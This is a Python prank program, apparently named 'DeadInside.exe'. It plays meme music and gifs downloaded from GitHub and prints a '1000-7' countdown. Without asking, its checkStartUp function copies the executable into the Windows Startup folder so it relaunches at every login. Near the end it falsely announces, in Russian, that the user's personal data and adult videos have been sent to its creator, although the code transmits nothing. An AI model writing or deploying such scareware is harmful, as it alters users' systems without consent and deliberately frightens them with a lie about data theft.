from pygame import mixer
from random import choice
from time import sleep
import shutil
import threading
import requests
import os
import sys
from pathlib import Path

class Setting:
	name = "DeadInside.exe"
	# Directories
	directory = os.getenv('USERPROFILE') + "/DeadInsideFiles"
	startUpDirectory = os.getenv('USERPROFILE') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
	musicDirectory = directory + "/music"
	videoDirectory = directory + "/video"

def checkStartUp():
	print("Проверка настроек программы...")
	if os.path.isdir(Setting.startUpDirectory) and not os.path.isfile(Setting.startUpDirectory + "/" + Setting.name):
		shutil.copyfile(r"" + sys.argv[0], r"" + Setting.startUpDirectory + "/" + Setting.name)
	else:
		print("Папка автозагрузки не найдена!")

def checkDirectories():
	print("Проверка директорий...")
	if not os.path.isdir(Setting.directory):
		os.mkdir(Setting.directory)
		os.mkdir(Setting.musicDirectory)
		os.mkdir(Setting.videoDirectory)
	else:
		if not os.path.isdir(Setting.musicDirectory):
			os.mkdir(Setting.musicDirectory)
		if not os.path.isdir(Setting.videoDirectory):
			os.mkdir(Setting.videoDirectory)

def sound(file):
	mixer.init()
	mixer.music.load(file)
	while True:
		sleep(0.1)
		if not mixer.music.get_busy():
			mixer.music.play()

def getFile(files):
	return choice(files).path

class MyFile:
	def __init__(self, name, path, url):
		self.name = name
		self.path = path
		self.url = url

	def download(self):
		if not os.path.isfile(self.path):
			print("Скачивание " + self.name + "...")
			req = requests.get(self.url, stream=True)
			if req.status_code == 200:
				with open(self.path,'wb') as f:
					f.write(req.content)

checkStartUp()
checkDirectories()
music = [
MyFile("toxin", Setting.musicDirectory + "/toxin.mp3", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/toxin.mp3"),
MyFile("bounce", Setting.musicDirectory + "/bounce.mp3", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/bounce.mp3"),
MyFile("hikari", Setting.musicDirectory + "/hikari.mp3", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/hikari.mp3")
]
video = [
MyFile("blue-zxc-cat", Setting.videoDirectory + "/blue-zxc-cat.gif", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/blue-zxc-cat.gif"),
MyFile("red-zxc-cat", Setting.videoDirectory + "/red-zxc-cat.gif", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/red-zxc-cat.gif"),
MyFile("zxc-cat", Setting.videoDirectory + "/zxc-cat.gif", "https://github.com/Matvey-Serdyuk/DeadInside/raw/main/DeadInsideFiles/zxc-cat.gif")
]


print("Проверка аудио файлов...")
for i in music:
	i.download()
print("Проверка видео файлов...")
for i in video:
	i.download()
print("Все готово!")
sleep(0.5)
print("Включите звук!")

t = threading.Thread(target=sound, args=(getFile(music),))
t.start()
os.system(getFile(video))

n = 1000
sleep(3)
while n > 7:
	sleep(0.125)
	print(str(n) + " - 7 = ", end="")
	n -= 7
	print(str(n), end="\n")

print("Поздравляю!")
sleep(0.25)
print("Все ваши личные данные (в том числе 18.93Гб видео для взрослых) переданы создателю данной программы!")
sleep(3)
print("Файлы находится в директории: " + Setting.directory)
sleep(0.5)
print("Можете их удалить...")
sleep(2)
print("Так же я, возможно, абсолютно случайно закинул этот файл в автозагрузку, чекните это: " + Setting.startUpDirectory)
sleep(100000)
